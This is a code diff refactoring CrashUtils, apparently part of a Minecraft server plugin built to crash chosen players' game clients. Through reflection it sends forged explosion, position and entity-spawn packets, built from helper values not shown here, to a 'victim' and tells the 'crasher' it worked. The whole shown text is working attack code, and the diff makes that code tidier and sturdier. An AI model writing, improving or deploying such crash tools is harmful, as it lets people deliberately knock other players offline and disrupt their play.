@@ -15,26 +15,29 @@ import java.util.Set;
 public class CrashUtils {
     private static final String serverVersion;
 
-    static Class<?> Vec3D;
-    static Class<?> PacketPlayOutExplosion;
-    static Class<?> PacketPlayOutPosition;
-    static Class<?> entityEnderDragonClass;
-    static Class<?> craftWorldClass;
-    static Class<?> worldClass;
-    static Class<?> packetPlayOutSpawnEntityLivingClass;
-    static Class<?> entityLivingClass;
-    static Class<?> craftPlayer;
-    static Class<?> Packet;
+    private static final Class<?> vec3D;
+    private static final Class<?> packetPlayOutExplosion;
+    private static final Class<?> packetPlayOutPosition;
+    private static final Class<?> entityEnderDragonClass;
+    private static final Class<?> craftWorldClass;
+    private static final Class<?> worldClass;
+    private static final Class<?> packetPlayOutSpawnEntityLivingClass;
+    private static final Class<?> entityLivingClass;
+    private static final Class<?> craftPlayer;
+    private static final Class<?> packet;
+    private static final Constructor<?> vec3DConstructor;
+    private static final Constructor<?> playOutConstructor;
+    private static final Constructor<?> playOutPositionConstructor;
 
     static {
         String path = Bukkit.getServer().getClass().getPackage().getName();
         serverVersion = path.substring(path.lastIndexOf(".") + 1);
 
         try {
-            Vec3D = Class.forName("net.minecraft.server." + serverVersion + ".Vec3D");
-            PacketPlayOutExplosion = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutExplosion");
+            vec3D = Class.forName("net.minecraft.server." + serverVersion + ".Vec3D");
+            packetPlayOutExplosion = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutExplosion");
 
-            PacketPlayOutPosition = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutPosition");
+            packetPlayOutPosition = Class.forName("net.minecraft.server." + serverVersion + ".PacketPlayOutPosition");
 
             entityEnderDragonClass = Class.forName("net.minecraft.server." + serverVersion + ".EntityEnderDragon");
             craftWorldClass = Class.forName("org.bukkit.craftbukkit." + serverVersion + ".CraftWorld");
@@ -43,8 +46,11 @@ public class CrashUtils {
             entityLivingClass = Class.forName("net.minecraft.server." + serverVersion + ".EntityLiving");
 
             craftPlayer = Class.forName("org.bukkit.craftbukkit." + serverVersion + ".entity.CraftPlayer");
-            Packet = Class.forName("net.minecraft.server." + serverVersion + ".Packet");
-        } catch (ClassNotFoundException e) {
+            packet = Class.forName("net.minecraft.server." + serverVersion + ".Packet");
+            vec3DConstructor = vec3D.getConstructor(double.class, double.class, double.class);
+            playOutConstructor = packetPlayOutExplosion.getConstructor(double.class, double.class, double.class, float.class, List.class, vec3D);
+            playOutPositionConstructor = packetPlayOutPosition.getConstructor(double.class, double.class, double.class, float.class, float.class, Set.class);
+        } catch (ClassNotFoundException | NoSuchMethodException e) {
             throw new RuntimeException(e);
         }
     }
@@ -55,30 +61,21 @@ public class CrashUtils {
      * @param victim    A player, which you want to crash
      * @param crashType The method you want to crash them with
      */
-    public static void crashPlayer(CommandSender crasher, Player victim, CrashType crashType) {
-        try {
+    public static void crashPlayer(CommandSender crasher, Player victim, CrashType crashType) throws Exception {
             switch (crashType) {
                 case EXPLOSION:
-                    Constructor<?> vec3DConstructor = Vec3D.getConstructor(double.class, double.class, double.class);
                     Object vec3d = vec3DConstructor.newInstance(
                             d(), d(), d());
-
-                    Constructor<?> playOutConstructor = PacketPlayOutExplosion.getConstructor(
-                            double.class, double.class, double.class, float.class, List.class, Vec3D);
                     Object explosionPacket = playOutConstructor.newInstance(
                             d(), d(), d(), f(), Collections.emptyList(), vec3d);
 
                     sendPacket(victim, explosionPacket);
-
                     break;
                 case POSITION:
-                    Constructor<?> playOutPositionConstructor = PacketPlayOutPosition.getConstructor(
-                            double.class, double.class, double.class, float.class, float.class, Set.class);
                     Object posPacket = playOutPositionConstructor.newInstance(
                             d(), d(), d(), f(), f(), Collections.emptySet());
 
                     sendPacket(victim, posPacket);
-
                     break;
                 case ENTITY:
                     Location loc = victim.getLocation();
@@ -107,16 +104,7 @@ public class CrashUtils {
                     });
                     break;
             }
-
             crasher.sendMessage(Crasher.PREFIX + "§aCrashed §2" + victim.getName() + " §ausing the §3" + crashType.name() + " §amethod!");
-
-        } catch (Exception e) {
-
-            crasher.sendMessage(Crasher.PREFIX + "§cFailed to crash §e" + victim.getName() + " §eusing " + crashType.name() + " §cmethod!");
-
-            System.err.println("[CRASHER] Failed to crash " + victim.getName() + " using " + crashType.name() + "!");
-            e.printStackTrace();
-        }
     }
 
     /**
@@ -133,7 +121,7 @@ public class CrashUtils {
         Object handle = getHandleMethod.invoke(craftPlayerObject);
         Object pc = handle.getClass().getField("playerConnection").get(handle);
 
-        Method sendPacketMethod = pc.getClass().getMethod("sendPacket", Packet);
+        Method sendPacketMethod = pc.getClass().getMethod("sendPacket", CrashUtils.packet);
 
         sendPacketMethod.invoke(pc, packet);
 
